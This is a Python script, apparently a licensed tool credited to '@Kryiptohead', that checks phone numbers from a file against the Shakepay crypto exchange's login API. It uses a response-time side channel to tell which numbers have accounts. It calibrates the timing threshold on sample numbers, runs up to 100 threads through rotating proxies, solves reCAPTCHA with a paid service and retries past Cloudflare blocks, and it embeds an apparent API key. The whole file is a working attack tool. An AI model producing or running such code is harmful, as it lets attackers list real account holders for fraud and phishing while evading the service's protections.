import json
import time
import logging
import tls_client
import csv
import threading
import queue
from datetime import datetime
import re
import random
import string
import os
import statistics
import hashlib
import uuid
import platform
import requests
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# License configuration
LICENSE_SERVER_URL = "http://176.10.119.115:5000/api/validate"
LICENSE_FILE = "license.key"

# File paths
PROXIES_FILE = 'proxies.txt'
PHONES_FILE = 'phone.txt'
RESULTS_CSV = 'results.csv'
VALID_FILE = 'valid.txt'
INVALID_FILE = 'invalid.txt'
LOG_FILE = 'shakepay_checker.log'
CONFIG_FILE = 'config.json'
SAVE_INTERVAL = 30  # Save results every 30 seconds

# Reduced number of calibration numbers for faster processing
CALIBRATION_NUMBERS = [
    "160432825824321",
    "125081316597890",
    "160450534141234",
    "160478055775678",
    "177899143349012"
]

# License validation function
def check_license():
    """Check if the license is valid"""
    print(f"{Fore.CYAN}Checking license...{Style.RESET_ALL}")
    
    # Generate hardware ID
    machine_id = str(uuid.getnode())  # MAC address
    cpu_info = platform.processor()
    system_info = platform.system() + platform.version()
    fingerprint = f"{machine_id}|{cpu_info}|{system_info}"
    hardware_id = hashlib.sha256(fingerprint.encode()).hexdigest()[:32]
    
    # Check if license file exists
    if not os.path.exists(LICENSE_FILE):
        print(f"{Fore.YELLOW}License file not found. Please enter your license key:{Style.RESET_ALL}")
        license_key = input("> ").strip()
        
        # Validate with server
        try:
            response = requests.post(
                LICENSE_SERVER_URL,
                json={
                    "license_key": license_key,
                    "hardware_id": hardware_id,
                    "initial": True
                },
                timeout=10
            )
            
            if response.status_code == 200 and response.json().get("valid", False):
                # Save license
                with open(LICENSE_FILE, "w") as f:
                    f.write(license_key)
                print(f"{Fore.GREEN}License activated successfully!{Style.RESET_ALL}")
                return True
            else:
                error_msg = response.json().get("message", "Unknown error")
                print(f"{Fore.RED}License activation failed: {error_msg}{Style.RESET_ALL}")
                input("Press Enter to exit...")
                sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}Error connecting to license server: {str(e)}{Style.RESET_ALL}")
            input("Press Enter to exit...")
            sys.exit(1)
    else:
        # Read existing license
        with open(LICENSE_FILE, "r") as f:
            license_key = f.read().strip()
        
        # Validate with server
        try:
            response = requests.post(
                LICENSE_SERVER_URL,
                json={
                    "license_key": license_key,
                    "hardware_id": hardware_id,
                    "initial": False
                },
                timeout=10
            )
            
            if response.status_code == 200 and response.json().get("valid", False):
                print(f"{Fore.GREEN}License validated successfully!{Style.RESET_ALL}")
                return True
            else:
                error_msg = response.json().get("message", "Unknown error")
                print(f"{Fore.RED}License validation failed: {error_msg}{Style.RESET_ALL}")
                # Remove invalid license file
                os.remove(LICENSE_FILE)
                input("Press Enter to exit...")
                sys.exit(1)
        except Exception as e:
            print(f"{Fore.YELLOW}Warning: Could not connect to license server: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Running in offline mode. Online validation will be required later.{Style.RESET_ALL}")
            # Allow offline use, but we'll check again later
            return True

# Load configuration from JSON file
def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"Config file not found. Creating default configuration in {CONFIG_FILE}...")
        config = {
            "captcha": {
                "api_key": "PUT-CAPSOLVER-KEY",
                "site_key": "6LdY6-EUAAAAADu0ghIPhwTAhCW1eVdoMuebASVh",
                "page_url": "http://shakepay.com/signin"
            },
            "num_threads": 100,
            "max_retries": 2  # Default max retries for Cloudflare blocks
        }
        # Save default config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
        return config
    except json.JSONDecodeError:
        print(f"Error parsing {CONFIG_FILE}. Using default configuration.")
        return {
            "captcha": {
                "api_key": "CAP-D7ACF44777B014171BD4FE1CA9B13B47530756ED91F3530AFD61C0B556107532",
                "site_key": "6LdY6-EUAAAAADu0ghIPhwTAhCW1eVdoMuebASVh",
                "page_url": "http://shakepay.com/signin"
            },
            "num_threads": 100,
            "max_retries": 3  # Default max retries for Cloudflare blocks
        }

# Load configuration
CONFIG = load_config()

# Threshold for determining valid/invalid numbers (will be auto-calculated)
VALID_THRESHOLD = None

# Thread-safe collections
phone_queue = queue.Queue()
calibration_queue = queue.Queue()
results = []
calibration_results = []
results_lock = threading.Lock()
calibration_lock = threading.Lock()
print_lock = threading.Lock()
save_event = threading.Event()  # Event to signal when to stop periodic saving
calibration_complete = threading.Event()  # Event to signal when calibration is complete

# Setup minimal logging with thread safety
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE)]
)
logger = logging.getLogger()

def load_list(file):
    try:
        with open(file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error(f"File not found: {file}")
        return []

def clean_phone_number(phone):
    """Clean and format phone number to pure digits format (14165436593)"""
    # Remove all non-digit characters
    digits_only = re.sub(r'\D', '', phone)
    
    # Handle North American numbers (add 1 if needed)
    if len(digits_only) == 10:
        return f"1{digits_only}"
    elif len(digits_only) == 11 and digits_only.startswith('1'):
        return digits_only
    else:
        # Just return the digits
        return digits_only

def generate_password():
    """Generate a random secure password"""
    length = random.randint(12, 16)
    chars = string.ascii_letters + string.digits + "!@#$%^&*._-"
    password = ''.join(random.choice(chars) for _ in range(length))
    # Ensure at least one uppercase, lowercase, digit and special char
    password += random.choice(string.ascii_uppercase)
    password += random.choice(string.ascii_lowercase)
    password += random.choice(string.digits)
    password += random.choice("!@#$%^&*._-")
    
    # Shuffle the password
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

def format_proxy(proxy_str):
    """Format proxy string from ip:port:username:password to http://username:password@ip:port"""
    if not proxy_str:
        return None
        
    try:
        parts = proxy_str.split(':')
        
        if len(parts) == 4:
            ip, port, username, password = parts
            return f"http://{username}:{password}@{ip}:{port}"
        elif len(parts) == 2:
            ip, port = parts
            return f"http://{ip}:{port}"
        else:
            logger.warning(f"Invalid proxy format: {proxy_str}")
            return None
    except Exception as e:
        logger.error(f"Error formatting proxy {proxy_str}: {str(e)}")
        return None

def solve_captcha(max_attempts=3):
    """Solve captcha with retry logic"""
    for attempt in range(1, max_attempts + 1):
        try:
            payload = {
                "clientKey": CONFIG['captcha']['api_key'],
                "task": {
                    "type": "ReCaptchaV2TaskProxyless",
                    "websiteURL": CONFIG['captcha']['page_url'],
                    "websiteKey": CONFIG['captcha']['site_key'],
                }
            }
            
            session = tls_client.Session(client_identifier="chrome_137")
            create_response = session.post("https://api.capsolver.com/createTask", json=payload)
            
            if create_response.status_code != 200:
                logger.error(f"Failed to create captcha task: {create_response.text}")
                continue
                
            create_data = create_response.json()
            if "errorId" in create_data and create_data["errorId"] > 0:
                logger.error(f"Captcha API error: {create_data.get('errorDescription', 'Unknown error')}")
                continue
                
            task_id = create_data.get('taskId')
            if not task_id:
                logger.error(f"No taskId in response: {create_data}")
                continue
            
            result_payload = {"clientKey": CONFIG['captcha']['api_key'], "taskId": task_id}
            
            # Poll for result
            for i in range(1, 60):
                time.sleep(2)
                
                result_response = session.post("https://api.capsolver.com/getTaskResult", json=result_payload)
                if result_response.status_code != 200:
                    logger.error(f"Failed to get task result: {result_response.text}")
                    break
                    
                result = result_response.json()
                if result.get("status") == "ready":
                    token = result.get('solution', {}).get('gRecaptchaResponse')
                    if token:
                        return token
                    else:
                        logger.error(f"No token in result: {result}")
                        break
            
        except Exception as e:
            logger.error(f"Error solving captcha: {str(e)}")
            
        # Wait before retry
        if attempt < max_attempts:
            time.sleep(5)
    
    raise Exception("Failed to solve captcha after multiple attempts")

def process_phone(phone, proxy=None, calibration_mode=False):
    """Process a single phone number"""
    formatted_phone = clean_phone_number(phone)
    formatted_proxy = format_proxy(proxy) if proxy else None
    unique_password = generate_password()
    
    # Only print phone info if not in calibration mode
    if not calibration_mode:
        with print_lock:
            print(f"Checking: {formatted_phone} using proxy: {proxy}")
    
    # Get max retries from config
    max_retries = CONFIG.get('max_retries', 3)
    retry_count = 0
    
    while retry_count <= max_retries:
        # Create a new session for each request
        session = tls_client.Session(
            client_identifier="chrome_137",
            random_tls_extension_order=True
        )
        
        # HEADERS
        headers = {
            "Host": "api.shakepay.com",
            "Sec-Ch-Ua-Platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Sec-Ch-Ua": "\"Brave\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            "Content-Type": "application/json",
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Gpc": "1",
            "Accept-Language": "en-GB,en;q=0.6",
            "Origin": "https://shakepay.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://shakepay.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=1, i"
        }
        
        response_data = {
            "phone": formatted_phone,
            "original_phone": phone,
            "proxy": proxy,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "response_time": None,
            "status_code": None,
            "is_valid": False,
            "error": None
        }
        
        try:
            # Send preflight OPTIONS request with the same proxy
            preflight_response = session.options(
                url="https://api.shakepay.com/authentication",
                headers={k: v for k, v in headers.items() if k != "Content-Type"},
                proxy=formatted_proxy
            )
            
            # Get captcha token
            token = solve_captcha()
            if not token:
                response_data["error"] = "Captcha solving failed"
                return response_data
            
            # PAYLOAD with unique password
            payload = {
                "strategy": "local",
                "username": formatted_phone,
                "password": unique_password,  # Unique password for each attempt
                "captchaToken": token,
                "totpType": "sms",
                "redirect": None
            }
            
            # Send POST request and measure response time
            start_time = time.time()
            response = session.post(
                "https://api.shakepay.com/authentication",
                headers=headers,
                json=payload,
                proxy=formatted_proxy  # Use the same proxy as preflight
            )
            elapsed = time.time() - start_time
            
            # Record response metrics
            response_data["response_time"] = round(elapsed, 3)
            response_data["status_code"] = response.status_code
            
            # Check if response is a Cloudflare block - using a more reliable indicator
            if response.text and "blocked_why_headline" in response.text:
                if retry_count < max_retries:
                    retry_count += 1
                    with print_lock:
                        print(f"{Fore.YELLOW}Cloudflare block detected for {formatted_phone}. Retrying ({retry_count}/{max_retries})...{Style.RESET_ALL}")
                    time.sleep(5)  # Wait before retry
                    continue
                else:
                    response_data["error"] = f"Cloudflare block after {max_retries} retries"
                    with print_lock:
                        print(f"{Fore.RED}Cloudflare block persisted for {formatted_phone} after {max_retries} retries{Style.RESET_ALL}")
                    return response_data
            
            # In calibration mode, don't determine validity (will be done after all tests)
            # In normal mode, use the calculated threshold
            if not calibration_mode and VALID_THRESHOLD is not None:
                response_data["is_valid"] = elapsed >= VALID_THRESHOLD
                
                # Print result with color (thread-safe)
                with print_lock:
                    if response_data["is_valid"]:
                        print(f"{Fore.GREEN}VALID: {formatted_phone} - Response time: {elapsed:.3f}s (> {VALID_THRESHOLD:.3f}s){Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}INVALID: {formatted_phone} - Response time: {elapsed:.3f}s (≤ {VALID_THRESHOLD:.3f}s){Style.RESET_ALL}")
            
            return response_data
            
        except Exception as e:
            error_msg = f"Request error: {str(e)}"
            logger.error(error_msg)
            response_data["error"] = error_msg
            
            # Only print errors if not in calibration mode
            if not calibration_mode:
                with print_lock:
                    print(f"{Fore.YELLOW}ERROR: {formatted_phone} - {error_msg}{Style.RESET_ALL}")
                    
            # Check if we should retry on error
            if retry_count < max_retries:
                retry_count += 1
                with print_lock:
                    print(f"{Fore.YELLOW}Retrying {formatted_phone} due to error ({retry_count}/{max_retries})...{Style.RESET_ALL}")
                time.sleep(3)  # Wait before retry
                continue
            else:
                return response_data

def calibration_worker():
    """Thread worker function for calibration"""
    while not calibration_complete.is_set():
        try:
            # Get a task from the queue (non-blocking with timeout)
            try:
                phone, proxy = calibration_queue.get(block=True, timeout=2)
            except queue.Empty:
                # No more tasks, exit the worker
                break
                
            # Process the phone number for calibration
            result = process_phone(phone, proxy, calibration_mode=True)
            
            # Add the result to the calibration results list (thread-safe)
            with calibration_lock:
                calibration_results.append(result)
                
                # Update progress
                progress = len(calibration_results) / len(CALIBRATION_NUMBERS) * 100
                with print_lock:
                    print(f"\r{Fore.CYAN}Calibration progress: {progress:.1f}%{Style.RESET_ALL}", end="", flush=True)
                
            # Mark the task as done
            calibration_queue.task_done()
            
        except Exception as e:
            logger.error(f"Calibration worker error: {str(e)}")
            continue

def worker():
    """Thread worker function to process phone numbers from the queue"""
    while True:
        try:
            # Get a task from the queue (non-blocking with timeout)
            try:
                task = phone_queue.get(block=True, timeout=5)
            except queue.Empty:
                # No more tasks, exit the worker
                break
                
            phone, original_phone, proxy = task
            
            # Process the phone number
            result = process_phone(phone, proxy)
            
            # Add the result to the results list (thread-safe)
            with results_lock:
                results.append(result)
                
            # Mark the task as done
            phone_queue.task_done()
            
        except Exception as e:
            logger.error(f"Worker error: {str(e)}")
            continue

def save_results(results_list):
    """Save results to CSV file and separate text files for valid/invalid numbers"""
    try:
        # Make a copy of the results list to avoid race conditions
        with results_lock:
            results_copy = results_list.copy()
        
        # Save to CSV
        with open(RESULTS_CSV, 'w', newline='') as csvfile:
            fieldnames = ['phone', 'original_phone', 'is_valid', 'response_time', 'status_code', 'timestamp', 'error']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for result in results_copy:
                writer.writerow({k: v for k, v in result.items() if k in fieldnames})
        
        # Save valid numbers to text file
        valid_numbers = [r['phone'] for r in results_copy if r.get('is_valid', False)]
        with open(VALID_FILE, 'w') as f:
            for phone in valid_numbers:
                f.write(f"{phone}\n")
        
        # Save invalid numbers to text file
        invalid_numbers = [r['phone'] for r in results_copy if not r.get('is_valid', False) and r.get('error') is None]
        with open(INVALID_FILE, 'w') as f:
            for phone in invalid_numbers:
                f.write(f"{phone}\n")
                
        with print_lock:
            print(f"Results saved - Valid: {len(valid_numbers)}, Invalid: {len(invalid_numbers)}, Total processed: {len(results_copy)}")
        
    except Exception as e:
        logger.error(f"Error saving results: {str(e)}")
        with print_lock:
            print(f"Error saving results: {str(e)}")

def periodic_save():
    """Periodically save results while the script is running"""
    while not save_event.is_set():
        # Save current results
        save_results(results)
        
        # Wait for the next save interval or until the event is set
        save_event.wait(timeout=SAVE_INTERVAL)

def calculate_threshold(calib_results):
    """Calculate the threshold based on calibration results"""
    # Filter out errors
    valid_results = [r for r in calib_results if r.get('error') is None]
    
    if not valid_results:
        print(f"{Fore.RED}No valid calibration results found. Using default threshold of 1.1s{Style.RESET_ALL}")
        return 1.1
    
    # Get response times
    response_times = [r.get('response_time', 0) for r in valid_results]
    
    # Calculate statistics
    avg_time = statistics.mean(response_times)
    max_time = max(response_times)
    min_time = min(response_times)
    
    # Add a buffer to the maximum time
    # This buffer is 10% of the max time, or at least 0.1 seconds
    buffer = max(0.1, max_time * 0.10)
    threshold = max_time + buffer
    
    print(f"\n{Fore.CYAN}===== THRESHOLD CALCULATION ====={Style.RESET_ALL}")
    print(f"Minimum response time: {min_time:.3f}s")
    print(f"Maximum response time: {max_time:.3f}s")
    print(f"Average response time: {avg_time:.3f}s")
    print(f"Buffer: {buffer:.3f}s")
    print(f"{Fore.GREEN}Calculated threshold: {threshold:.3f}s{Style.RESET_ALL}")
    print(f"Numbers with response time > {threshold:.3f}s will be considered VALID")
    print(f"Numbers with response time ≤ {threshold:.3f}s will be considered INVALID")
    
    return round(threshold, 3)

def calibrate():
    """Run calibration to determine the optimal threshold using parallel processing"""
    global VALID_THRESHOLD, calibration_results
    
    # Reset calibration results
    calibration_results = []
    print('''                                                                                                                                                                                              
   d888888o.   8 8888        8          .8.          8 8888     ,88' 8 8888888888   8 888888888o      .8.   `8.`8888.      ,8'           `8.`888b           ,8' b.             8           
 .`8888:' `88. 8 8888        8         .888.         8 8888    ,88'  8 8888         8 8888    `88.   .888.   `8.`8888.    ,8'             `8.`888b         ,8'  888o.          8           
 8.`8888.   Y8 8 8888        8        :88888.        8 8888   ,88'   8 8888         8 8888     `88  :88888.   `8.`8888.  ,8'               `8.`888b       ,8'   Y88888o.       8           
 `8.`8888.     8 8888        8       . `88888.       8 8888  ,88'    8 8888         8 8888     ,88 . `88888.   `8.`8888.,8'                 `8.`888b     ,8'    .`Y888888o.    8           
  `8.`8888.    8 8888        8      .8. `88888.      8 8888 ,88'     8 888888888888 8 8888.   ,88'.8. `88888.   `8.`88888'                   `8.`888b   ,8'     8o. `Y888888o. 8           
   `8.`8888.   8 8888        8     .8`8. `88888.     8 8888 88'      8 8888         8 888888888P'.8`8. `88888.   `8. 8888                     `8.`888b ,8'      8`Y8o. `Y88888o8           
    `8.`8888.  8 8888888888888    .8' `8. `88888.    8 888888<       8 8888         8 8888      .8' `8. `88888.   `8 8888                      `8.`888b8'       8   `Y8o. `Y8888           
8b   `8.`8888. 8 8888        8   .8'   `8. `88888.   8 8888 `Y8.     8 8888         8 8888     .8'   `8. `88888.   8 8888                       `8.`888'        8      `Y8o. `Y8           
`8b.  ;8.`8888 8 8888        8  .888888888. `88888.  8 8888   `Y8.   8 8888         8 8888    .888888888. `88888.  8 8888                        `8.`8'         8         `Y8o.`           
 `Y8888P ,88P' 8 8888        8 .8'       `8. `88888. 8 8888     `Y8. 8 888888888888 8 8888   .8'       `8. `88888. 8 8888                         `8.`          8            `Yo           
          
          
           by @Kryiptohead
          
          ''')
    print(f"{Fore.CYAN}Starting calibration...{Style.RESET_ALL}")
    
    # Use the hardcoded calibration numbers
    test_phones = CALIBRATION_NUMBERS
    
    # Load proxies
    proxies = load_list(PROXIES_FILE)
    if not proxies:
        print(f"Warning: No proxies found in {PROXIES_FILE}. Continuing without proxies.")
    
    # Reset the calibration complete event
    calibration_complete.clear()
    
    # Fill the calibration queue
    for i, phone in enumerate(test_phones):
        # Select a proxy
        if proxies:
            proxy = proxies[i % len(proxies)]
        else:
            proxy = None
        
        # Add to calibration queue
        calibration_queue.put((phone, proxy))
    
    # Create and start calibration worker threads
    num_calib_threads = min(5, len(test_phones))  # Use up to 5 threads for calibration
    calib_threads = []
    
    for i in range(num_calib_threads):
        thread = threading.Thread(target=calibration_worker, name=f"CalibThread-{i+1}")
        thread.daemon = True
        thread.start()
        calib_threads.append(thread)
    
    # Wait for all calibration tasks to be processed
    calibration_queue.join()
    
    # Signal the calibration threads to stop
    calibration_complete.set()
    
    # Wait for all calibration threads to finish
    for thread in calib_threads:
        thread.join(timeout=1)
    
    # New line after progress indicator
    print()
    
    # Calculate the threshold
    VALID_THRESHOLD = calculate_threshold(calibration_results)
    
    print(f"\n{Fore.GREEN}Calibration complete. Threshold set to {VALID_THRESHOLD}s{Style.RESET_ALL}")
    return calibration_results

def main():
    global VALID_THRESHOLD
    
    # First, check license before doing anything else
    if not check_license():
        return
    
    # Check for fixed threshold in arguments
    import sys
    if len(sys.argv) > 1 and sys.argv[1].replace('.', '', 1).isdigit():
        # Use provided threshold instead of calibrating
        VALID_THRESHOLD = float(sys.argv[1])
        print(f"{Fore.CYAN}Using fixed threshold: {VALID_THRESHOLD}s (skipping calibration){Style.RESET_ALL}")
    else:
        # Run fast parallel calibration to determine the threshold
        calibrate()
    
    # Load and clean phone numbers
    raw_phones = load_list(PHONES_FILE)
    if not raw_phones:
        print(f"No phone numbers found in {PHONES_FILE}")
        return
    
    # Load proxies
    proxies = load_list(PROXIES_FILE)
    if not proxies:
        print(f"Warning: No proxies found in {PROXIES_FILE}. Continuing without proxies.")
    
    print(f"Loaded {len(raw_phones)} phone numbers and {len(proxies)} proxies")
    
    # Clean and format phone numbers
    phones = [clean_phone_number(phone) for phone in raw_phones]
    print("Phone numbers formatted successfully")
    
    # Fill the queue with tasks
    for i, (phone, original_phone) in enumerate(zip(phones, raw_phones)):
        # Select a proxy - ensure each phone gets a different proxy
        if proxies:
            proxy = proxies[i % len(proxies)]
        else:
            proxy = None
        
        # Add task to queue
        phone_queue.put((phone, original_phone, proxy))
    
    print(f"Starting {CONFIG['num_threads']} worker threads to process {len(phones)} phone numbers")
    
    # Start the periodic save thread
    save_event.clear()
    save_thread = threading.Thread(target=periodic_save, name="SaveThread")
    save_thread.daemon = True
    save_thread.start()
    
    # Create and start worker threads
    threads = []
    for i in range(min(CONFIG['num_threads'], len(phones))):
        thread = threading.Thread(target=worker, name=f"Worker-{i+1}")
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for all tasks to be processed
    phone_queue.join()
    
    # Signal the save thread to stop
    save_event.set()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join(timeout=1)
    
    # Wait for the save thread to finish
    save_thread.join(timeout=1)
    
    print("All phone checks completed")
    
    # Final save of results
    save_results(results)
    
    # Print summary
    valid_count = sum(1 for r in results if r.get('is_valid', False))
    invalid_count = sum(1 for r in results if not r.get('is_valid', False) and r.get('error') is None)
    error_count = sum(1 for r in results if r.get('error') is not None)
    
    print("\n===== FINAL RESULTS SUMMARY =====")
    print(f"{Fore.GREEN}Valid numbers: {valid_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}Invalid numbers: {invalid_count}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Errors: {error_count}{Style.RESET_ALL}")
    print(f"Total processed: {len(results)}")
    print(f"Results saved to:")
    print(f"- CSV: {RESULTS_CSV}")
    print(f"- Valid numbers: {VALID_FILE}")
    print(f"- Invalid numbers: {INVALID_FILE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user")
        # Save results on interrupt
        save_results(results)
        print("Results saved before exit")
    except Exception as e:
        logger.error(f"Unhandled exception: {str(e)}")
        print(f"Error: {str(e)}")
        # Save results on error
        save_results(results)
        print("Results saved before exit")